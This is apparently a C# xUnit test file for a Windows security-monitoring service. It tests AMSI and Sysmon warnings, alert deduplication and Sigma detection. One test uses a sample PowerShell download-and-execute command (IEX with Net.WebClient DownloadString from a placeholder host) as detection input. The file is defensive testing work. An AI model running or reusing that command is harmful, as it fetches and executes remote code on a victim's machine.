using Downpour.Contracts;
using Downpour.Core;
using Downpour.Service;
using Microsoft.Extensions.Logging.Abstractions;

namespace Downpour.Tests;

public sealed class DetectionHealthTests
{
    [Fact]
    public void SensorWarningsSurviveUnrelatedAlertRefreshAndClearIndependently()
    {
        var store = new SecurityAlertSnapshotStore();
        store.SetSourceWarnings("AMSI", ["AMSI provider unavailable."]);
        store.SetSourceWarnings("Sysmon", ["Sysmon not installed."]);
        store.Publish(new(1, DateTimeOffset.UtcNow, 0, [], []));
        Assert.Equal(2, store.Current.Warnings.Count);
        Assert.True(SecurityAlertClient.IsValidSnapshot(store.Current));
        store.SetSourceWarnings("AMSI", []);
        Assert.Equal("Sysmon not installed.", Assert.Single(store.Current.Warnings));
    }

    [Fact]
    public void SourceWarningsAreBoundedAndCannotInjectControlCharacters()
    {
        var store = new SecurityAlertSnapshotStore();
        store.SetSourceWarnings("source", ["bad\nline", new string('x', 513), "one", "two", "three", "four", "five"]);
        store.Publish(new(1, DateTimeOffset.UtcNow, 0, [], []));
        Assert.Equal(4, store.Current.Warnings.Count);
        Assert.True(SecurityAlertClient.IsValidSnapshot(store.Current));
    }

    [Fact]
    public void AmsiFailureRetainsSigmaDetectionsWithoutPersistingScriptText()
    {
        var processor = new SigmaAmsiEventProcessor(NullLogger<SigmaAmsiEventProcessor>.Instance,
            (_, _) => new(unchecked((int)0x80070005), null));
        var block = new ScriptBlock(1, DateTimeOffset.UtcNow, "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", 1, 1);
        var alerts = processor.ProcessScriptBlock(block);
        Assert.NotEmpty(alerts);
        Assert.All(alerts, alert => Assert.StartsWith("Sigma", alert.Title));
        Assert.Contains("unavailable", processor.AmsiWarning!);
        Assert.DoesNotContain(block.Text, System.Text.Json.JsonSerializer.Serialize(alerts));
    }

    [Fact]
    public void SuccessfulProviderRetryClearsTheUnavailableWarning()
    {
        var failing = true;
        var processor = new SigmaAmsiEventProcessor(NullLogger<SigmaAmsiEventProcessor>.Instance,
            (_, _) => failing ? new(unchecked((int)0x80070005), null) : new(0, 1));
        var block = new ScriptBlock(1, DateTimeOffset.UtcNow, "benign", 1, 1);
        processor.ProcessScriptBlock(block);
        Assert.NotNull(processor.AmsiWarning);
        failing = false;
        processor.ProcessScriptBlock(block);
        Assert.Null(processor.AmsiWarning);
    }

    [Fact]
    public void DedupIsBoundedExpiresAndDistinguishesReusedLogRecords()
    {
        var clock = new TestClock();
        var processor = new SigmaAmsiEventProcessor(NullLogger<SigmaAmsiEventProcessor>.Instance,
            (_, _) => new(0, 40000), clock);
        var block = new ScriptBlock(1, clock.GetUtcNow(), "benign", 1, 1);
        var first = Assert.Single(processor.ProcessScriptBlock(block));
        Assert.Empty(processor.ProcessScriptBlock(block));
        var reused = Assert.Single(processor.ProcessScriptBlock(block with { CreatedAtUtc = block.CreatedAtUtc!.Value.AddSeconds(1) }));
        Assert.NotEqual(first.AlertId, reused.AlertId);
        for (var i = 2; i < SigmaAmsiEventProcessor.MaximumDedupEntries + 10; i++)
            processor.ProcessScriptBlock(block with { RecordId = i });
        Assert.Equal(SigmaAmsiEventProcessor.MaximumDedupEntries, processor.DedupEntryCount);
        clock.Advance(TimeSpan.FromMinutes(5));
        processor.CleanupOldEntries(TimeSpan.FromMinutes(5));
        Assert.Equal(0, processor.DedupEntryCount);
        Assert.Single(processor.ProcessScriptBlock(block));
    }
}
